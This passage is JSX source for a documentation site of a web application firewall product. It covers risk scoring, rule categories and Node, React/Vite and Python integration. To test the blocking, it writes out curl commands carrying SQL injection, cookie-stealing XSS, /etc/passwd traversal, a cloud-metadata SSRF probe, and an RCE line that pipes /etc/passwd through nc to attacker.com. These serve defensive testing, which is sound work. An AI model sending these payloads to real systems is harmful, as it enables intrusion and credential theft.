              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Risk Scoring &amp; Threat Categorization</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Every request analyzed by MDefender receives a continuous risk score between 0 and 100 alongside multi-vector classification probabilities.
              </p>

              <div style={{
                background: '#0a0e1a',
                border: '1px solid #1e293b',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '16px', fontWeight: '800', color: '#f8fafc', marginBottom: '14px' }}>
                  Decision Threshold Matrix
                </h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: 'rgba(16,185,129,0.1)', border: '1px solid rgba(16,185,129,0.25)' }}>
                    <span style={{ color: '#34d399', fontWeight: '700', fontSize: '13px' }}>Score 0 &ndash; 39 (Clean)</span>
                    <span style={{ color: '#cbd5e1', fontSize: '13px' }}>Pass directly to application &bull; No overhead</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: 'rgba(245,158,11,0.1)', border: '1px solid rgba(245,158,11,0.25)' }}>
                    <span style={{ color: '#fbbf24', fontWeight: '700', fontSize: '13px' }}>Score 40 &ndash; 69 (Suspicious)</span>
                    <span style={{ color: '#cbd5e1', fontSize: '13px' }}>Logged in telemetry &bull; Rate-limited</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: 'rgba(239,68,68,0.15)', border: '1px solid rgba(239,68,68,0.3)' }}>
                    <span style={{ color: '#f87171', fontWeight: '800', fontSize: '13px' }}>Score 70 &ndash; 100 (Critical Attack)</span>
                    <span style={{ color: '#f87171', fontWeight: '700', fontSize: '13px' }}>Blocked immediately with HTTP 403 Cyber Screen</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Section: Rules Overview */}
          {activeSection === 'rules-overview' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>2,000 Enterprise WAF Rules Catalog</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '20px' }}>
                MDefender Pro incorporates 2,000 distinct regular expression detection signatures organized across 7 major threat vectors:
              </p>

              <div style={{ overflowX: 'auto', margin: '20px 0' }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
                  <thead>
                    <tr style={{ background: '#0c1222', textAlign: 'left', borderBottom: '1px solid #1e293b' }}>
                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Category</th>
                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Rule Count</th>
                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Key Vectors Covered</th>
                      <th style={{ padding: '12px 14px', color: '#f1f5f9' }}>Severity</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>SQL Injection</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>350 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>Union Select, Boolean Tautologies, Time delays, Stacked DDL</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>Cross-Site Scripting (XSS)</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>350 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>HTML5 tags, 25+ event handlers, DOM Sinks, Obfuscated JS</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>RCE &amp; WebShells</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>350 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>Linux binaries, PowerShell, 22+ WebShells, Deserialization</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>Directory Traversal / LFI</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>250 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>Nested sequences, /etc/passwd, win.ini, PHP stream wrappers</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#fbbf24', fontWeight: '800' }}>HIGH</span></td>
                    </tr>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>CMS Vulnerabilities</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>300 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>WordPress plugins, Laravel .env, Spring4Shell, Log4j</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>Bots &amp; Scanners</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>200 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>sqlmap, Nikto, Acunetix, DirBuster, scrapers</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#fbbf24', fontWeight: '800' }}>HIGH</span></td>
                    </tr>
                    <tr>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: '#f1f5f9' }}>SSRF &amp; XXE</td>
                      <td style={{ padding: '12px 14px', color: '#38bdf8', fontWeight: '700' }}>200 Rules</td>
                      <td style={{ padding: '12px 14px', color: '#94a3b8' }}>AWS/GCP metadata, internal subnets, XML External Entities</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#f87171', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Section: SQLi Defense */}
          {activeSection === 'sqli-defense' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>OWASP Top 1: A03:2021</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>SQL Injection Defense (350 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                MDefender intercepts SQL injection across query parameters, POST JSON, multipart form data, and HTTP header values.
              </p>
              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '24px' }}>
                <h4 style={{ color: '#38bdf8', margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered SQLi Attack Techniques</h4>
                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: '#94a3b8', lineHeight: '1.8', margin: 0 }}>
                  <li><strong>Union-Based Extraction:</strong> Detects <code>UNION ALL SELECT</code>, column balancing, and schema table probing.</li>
                  <li><strong>Boolean-Based Blind Injections:</strong> Detects tautologies (<code>' OR '1'='1</code>, <code>admin' -- -</code>).</li>
                  <li><strong>Time-Based Blind Injections:</strong> Detects <code>SLEEP()</code>, <code>pg_sleep()</code>, and <code>WAITFOR DELAY</code>.</li>
                  <li><strong>Stacked Queries &amp; DDL Injections:</strong> Detects <code>; DROP TABLE</code>, <code>; UPDATE</code>, <code>EXEC master..xp_cmdshell</code>.</li>
                </ul>
              </div>
              <CodeBlock language="bash" code={`# Test SQLi Blocking:
curl -i "http://localhost:5000/api/books?id=1%27%20UNION%20SELECT%20null,password%20FROM%20users--"`} />
            </div>
          )}

          {/* Section: XSS Defense */}
          {activeSection === 'xss-defense' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>OWASP Top 3: A03:2021</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Cross-Site Scripting (XSS) Defense</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Intercepts Reflected, Stored, and DOM-based Cross-Site Scripting payloads before they can execute in client browsers or reach server renderers.
              </p>
              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '24px' }}>
                <h4 style={{ color: '#38bdf8', margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered XSS Attack Techniques</h4>
                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: '#94a3b8', lineHeight: '1.8', margin: 0 }}>
                  <li><strong>Dangerous HTML5 Tags:</strong> <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;svg onload=...&gt;</code>.</li>
                  <li><strong>DOM Event Handlers:</strong> Detects 25+ event sinks including <code>onerror</code>, <code>onload</code>, <code>onmouseover</code>, <code>onfocus</code>.</li>
                  <li><strong>Pseudo-Protocols:</strong> Detects <code>javascript:</code>, <code>vbscript:</code>, and <code>data:text/html;base64,...</code> URI schemes.</li>
                </ul>
              </div>
              <CodeBlock language="bash" code={`# Test XSS Blocking:
curl -i "http://localhost:5000/api/books?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E"`} />
            </div>
          )}

          {/* Section: RCE & WebShells */}
          {activeSection === 'rce-webshells' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Remote Code Execution &amp; WebShells (350 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Prevents command injection into OS system shells, PowerShell execution, reverse shell pipelines, and PHP backdoor webshells.
              </p>
              <CodeBlock language="bash" code={`# Test RCE Blocking:
curl -i "http://localhost:5000/api/tools?cmd=;cat%20/etc/passwd|nc%20attacker.com%204444"`} />
            </div>
          )}

          {/* Section: LFI & Path Traversal */}
          {activeSection === 'lfi-traversal' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#fbbf24', fontSize: '12px', fontWeight: '700' }}>250 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Directory Traversal &amp; LFI (250 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Prevents attackers from escaping web root directories to read sensitive configuration files, system credentials, or database keys.
              </p>
              <CodeBlock language="bash" code={`# Test LFI / Path Traversal:
curl -i "http://localhost:5000/api/books?id=../../../../etc/passwd"`} />
            </div>
          )}

          {/* Section: CMS Vulnerabilities */}
          {activeSection === 'cms-vulnerabilities' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>300 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>CMS Exploits &amp; Framework Vulnerabilities</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Dedicated rules for WordPress plugin exploits, Laravel <code>.env</code> key exposure, Log4Shell (<code>${'${'}jndi:ldap...{'}'}</code>), and Spring4Shell CVEs.
              </p>
              <CodeBlock language="bash" code={`# Test CMS Exploit Block:
curl -i "http://localhost:5000/.env"`} />
            </div>
          )}

          {/* Section: Bots & Scanners */}
          {activeSection === 'bots-scanners' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#fbbf24', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Bots &amp; Vulnerability Scanners (200 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Identifies automated probing tools (sqlmap, Nikto, Acunetix, DirBuster, WPScan, Gobuster) and immediately terminates connection before reconnaissance completes.
              </p>
              <CodeBlock language="bash" code={`# Test Scanner Interception:
curl -i -H "User-Agent: sqlmap/1.6#stable" "http://localhost:5000/api/books"`} />
            </div>
          )}

          {/* Section: SSRF & XXE */}
          {activeSection === 'ssrf-xxe' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>SSRF &amp; XXE Protection (200 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Blocks Server-Side Request Forgery against cloud metadata instances (<code>169.254.169.254</code>) and XML External Entity injection.
              </p>
              <CodeBlock language="bash" code={`# Test SSRF Cloud Metadata Probe:
curl -i "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/"`} />
            </div>
          )}

          {/* Section: Node.js SDK */}
          {activeSection === 'sdk-nodejs' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(59, 130, 246, 0.15)',
                  border: '1px solid rgba(59, 130, 246, 0.3)',
                  color: '#60a5fa',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Official npm Package</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Zero External Dependencies</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Node.js &amp; Express Integration</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Protect your Node.js, Express, or Next.js backend with <code>mdefender-pro</code>. When you install the package, our high-performance cyber-styled <strong>403 Block Page</strong> is automatically bundled &mdash; simply add your API key to activate real-time threat defense.
              </p>

              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-1" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Install the NPM Package
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Run this in your website backend directory:
                </p>
                <CodeBlock language="bash" code={`npm install mdefender-pro`} />
              </div>

              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-2" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Initialize Configuration via CLI
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Run our 1-click interactive CLI generator to configure your API key and options:
                </p>
                <CodeBlock language="bash" code={`npx mdefender-pro init`} />
                <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '12px' }}>
                  Or manually create <code>mdefender.config.js</code> in your project root:
                </p>
                <CodeBlock
                  language="javascript"
                  code={`// mdefender.config.js
module.exports = {
  // Your Secret API Key from MDefender Dashboard -> Websites
  apiKey: process.env.MDEFENDER_API_KEY || 'YOUR_API_KEY_HERE',

  // Registered domain
  domain: 'yourdomain.com',

  // Endpoint
  apiEndpoint: 'http://217.15.170.82',

  // Mode: 'block' (active defense) or 'monitor' (log-only)
  mode: 'block',

  // Safety timeout in ms (fails open if cloud unreachable)
  timeout: 3000,

  // Skip static assets
  skipPaths: ['/favicon.ico', '/static', '/assets', '/health'],

  // Log blocked attacks in console
  logBlocked: true
};`}
                />
              </div>

              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-3" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Attach WAF Middleware to Express
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Place <code>mdefender()</code> right after body parsers (<code>express.json()</code>) and before your application routes:
                </p>
                <CodeBlock
                  language="javascript"
                  code={`const express = require('express');
const cors = require('cors');
const mdefender = require('mdefender-pro');

const app = express();

// 1. Standard body parsers
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 2. Attach MDefender Pro WAF Middleware
// Automatically loads mdefender.config.js and serves bundled 403 block page
app.use(mdefender());

// 3. Application Routes
app.use('/api/books', require('./routes/books'));
app.use('/api/users', require('./routes/users'));

app.listen(5000, () => {
  console.log('Server running with MDefender Pro active protection!');
});`}
                />
              </div>
            </div>
          )}

          {/* Section: React / Vite / SPA Frontend SDK */}
          {activeSection === 'sdk-react-vite' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(56, 189, 248, 0.15)',
                  border: '1px solid rgba(56, 189, 248, 0.3)',
                  color: '#38bdf8',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Frontend &amp; Single Page Apps</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>0ms Client Shield + Vite Server Plugin</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>React / Vite / SPA Frontend Integration</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Protect Single Page Applications built with <strong>React, Vite, Vue, Svelte, or Next.js</strong>. MDefender Pro provides <strong>dual-layer frontend protection</strong>: client-side 0ms DOM/URL/Fetch protection and Vite dev/preview server 403 network blocking.
              </p>

              {/* Step 1: Install */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-1" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Install the NPM Package
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Install <code>mdefender-pro</code> in your frontend project:
                </p>
                <CodeBlock language="bash" code={`npm install mdefender-pro`} />
              </div>

              {/* Step 2: Client SPA Protection */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-2" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Initialize Client Guard in <code>main.jsx</code> / <code>index.jsx</code>
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Call <code>initWaf()</code> at the very top of your application entry point:
                </p>
                <CodeBlock
                  language="javascript"
                  code={`// src/main.jsx (or src/index.js)
import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App.jsx';
import './index.css';

// 1. Import and initialize MDefender Client Shield
import { initWaf } from 'mdefender-pro/client';

initWaf({
  apiKey: 'YOUR_MDEFENDER_API_KEY', // from Dashboard -> Settings
  domain: 'localhost',              // or your production domain
  apiEndpoint: 'http://217.15.170.82' // MDefender Cloud Endpoint
});

ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);`}
                />
                <div style={{ padding: '12px 16px', borderRadius: '8px', background: 'rgba(37,99,235,0.1)', border: '1px solid rgba(59,130,246,0.3)', marginTop: '14px' }}>
                  <p style={{ margin: 0, fontSize: '12.5px', color: '#93c5fd', lineHeight: '1.6' }}>
                    <strong>What <code>initWaf()</code> protects:</strong> Automatically intercepts malicious URL query parameters (XSS, LFI, SQLi), outgoing <code>fetch</code> &amp; <code>axios</code> payloads, and swaps the DOM with the 403 Security Screen while dispatching real-time incident telemetry to your dashboard.
                  </p>
                </div>
              </div>

              {/* Step 3: Vite Server Plugin */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-3" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Add the Vite Server Plugin in <code>vite.config.js</code>
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Add <code>mdefenderVite</code> to your plugins so Vite returns a real <code>HTTP 403 Forbidden</code> status code over the network:
                </p>
                <CodeBlock
                  language="javascript"
                  code={`// vite.config.js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { mdefenderVite } from 'mdefender-pro/vite';

export default defineConfig({
  plugins: [
    mdefenderVite({
      apiKey: 'YOUR_MDEFENDER_API_KEY',
      domain: 'localhost',
      apiEndpoint: 'http://217.15.170.82'
    }),
    react()
  ],
  server: {
    port: 5173,
    proxy: {
      '/api': {
        target: 'http://localhost:4000',
        changeOrigin: true
      }
    }
  }
});`}
                />
              </div>
            </div>
          )}

          {/* Section: Full-Stack Web Apps */}
          {activeSection === 'sdk-fullstack' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'linear-gradient(135deg, rgba(37,99,235,0.2), rgba(124,58,237,0.2))',
                  border: '1px solid rgba(59, 130, 246, 0.4)',
                  color: '#60a5fa',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Full-Stack Architecture</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Backend + Frontend Unified Defense</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Connecting Full-Stack Web Projects</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                For modern applications with a separate <strong>Backend API (e.g. Express on Port 4000)</strong> and <strong>Frontend SPA (e.g. React/Vite on Port 5173)</strong>, connect both sides using the same API Key for complete end-to-end telemetry and defense.
              </p>

              <div style={{
                background: '#0a0e1a',
                border: '1px solid #1e293b',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '16px', fontWeight: '800', color: '#f8fafc', marginBottom: '16px' }}>
                  <i className="fa-solid fa-diagram-project" style={{ color: '#38bdf8', marginRight: '8px' }}></i>
                  Unified Full-Stack Protection Flow
                </h3>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
                  <div style={{ background: '#0f172a', padding: '18px', borderRadius: '10px', border: '1px solid #334155' }}>
                    <div style={{ color: '#38bdf8', fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>
                      <i className="fab fa-react" style={{ marginRight: '6px' }}></i> Frontend Layer (Port 5173)
                    </div>
                    <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.8' }}>
                      <li><code>mdefenderVite</code> in <code>vite.config.js</code></li>
                      <li><code>initWaf()</code> in <code>main.jsx</code></li>
                      <li>Blocks direct URL/DOM attacks with 403 block page</li>
                      <li>Captures client telemetry to MDefender Cloud</li>
                    </ul>
                  </div>

                  <div style={{ background: '#0f172a', padding: '18px', borderRadius: '10px', border: '1px solid #334155' }}>
                    <div style={{ color: '#10b981', fontWeight: '700', fontSize: '14px', marginBottom: '8px' }}>
                      <i className="fab fa-node-js" style={{ marginRight: '6px' }}></i> Backend Layer (Port 4000)
                    </div>
                    <ul style={{ margin: 0, paddingLeft: '18px', fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.8' }}>
                      <li><code>app.use(mdefender())</code> in <code>index.js</code></li>
                      <li>Inspects API endpoints (<code>/api/books</code>, <code>/api/users</code>)</li>
                      <li>Blocks SQLi, RCE, and payload attacks with 403 status</li>
                      <li>Streams telemetry to user dashboard</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Section: Python SDK */}
          {activeSection === 'sdk-python' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(59, 130, 246, 0.15)', border: '1px solid rgba(59, 130, 246, 0.3)', color: '#60a5fa', fontSize: '12px', fontWeight: '700' }}>Python SDK</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>FastAPI &bull; Django &bull; Flask</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Python / FastAPI / Django Integration</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Protect any Python web application using MDefender ASGI / WSGI middleware.
              </p>

              <h3 style={{ fontSize: '17px', fontWeight: '700', color: '#38bdf8', marginBottom: '10px' }}>FastAPI ASGI Middleware</h3>
              <CodeBlock
                language="python"
                code={`from fastapi import FastAPI, Request
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import HTMLResponse
import requests

app = FastAPI()

class MDefenderFastAPIMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # Forward request metadata to MDefender WAF Cloud
        payload = {
            "domain": request.headers.get("host", "localhost"),
            "request": {
                "method": request.method,
                "url": str(request.url),
